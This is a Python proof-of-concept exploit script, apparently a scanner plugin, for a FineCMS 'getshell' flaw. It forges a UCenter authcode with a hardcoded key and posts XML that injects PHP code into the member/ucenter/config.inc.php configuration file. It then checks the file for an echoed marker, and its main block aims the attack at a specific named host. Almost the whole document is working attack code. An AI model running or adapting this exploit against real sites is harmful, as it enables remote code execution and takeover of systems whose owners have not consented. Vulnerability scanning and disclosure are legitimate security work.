#!/usr/bin/env python
#-*- coding:utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2015-0141125
import hashlib
import time
import math
import base64
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse


        
def assign(service, arg):
    if service == "finecms":
        return True, arg
        
def audit(arg):
    def microtime(get_as_float = False):
        if get_as_float:
            return time.time()
        else:
            return '%.8f %d' % math.modf(time.time())
        
    def get_authcode(string, key = ''):
        ckey_length = 4
        key = hashlib.md5(key).hexdigest()
        keya = hashlib.md5(key[0:16]).hexdigest()
        keyb = hashlib.md5(key[16:32]).hexdigest()
        keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
        cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
 
        key_length = len(cryptkey)
        string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
        string_length = len(string)
        result = ''
        box = list(range(0, 256))
        rndkey = dict()
        for i in range(0,256):
            rndkey[i] = ord(cryptkey[i % key_length])
        j=0
        for i in range(0,256):
            j = (j + box[i] + rndkey[i]) % 256
            tmp = box[i]
            box[i] = box[j]
            box[j] = tmp
        a=0
        j=0
        for i in range(0,string_length):
            a = (a + 1) % 256
            j = (j + box[a]) % 256
            tmp = box[a]
            box[a] = box[j]
            box[j] = tmp
            result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
        return keyc + base64.b64encode(result).replace('=', '')

    def get_shell(url,key):
        headers={'Accept-Language':'zh-cn',
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
        'Referer':url
        }
        tm = time.time()+10*3600
        tm="time=%d&action=updateapps" %tm
        code = urllib.parse.quote(get_authcode(tm,key))
        url=url+"?code="+code
        data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
                <root>
                <item id="UC_API">http://xxx\');echo("testvul");//</item>
                </root>'''
        try:
            req=urllib.request.Request(url,data=data1,headers=headers)
            ret=urllib.request.urlopen(req)
        except:
            return "error"
        data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
                <root>
                <item id="UC_API">http://aaa</item>
                </root>'''
        try:
            req=urllib.request.Request(url,data=data2,headers=headers)
            ret=urllib.request.urlopen(req)
        except:
            return "error"
        return 1
    res = get_shell(arg+"member/api/uc.php",'8808cer8o1UJsEpt2G2Jn0uhEn/YgEva589Mfo0')
    if res != 1:
        return False
    poc = arg + 'member/ucenter/config.inc.php'
    code, head, res, errcode, _ = curl.curl2(poc)
    if 'testvul' in res:
        security_hole("finecms getshell:" + poc)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('finecms', 'http://dkd.gulumi.com/')[1])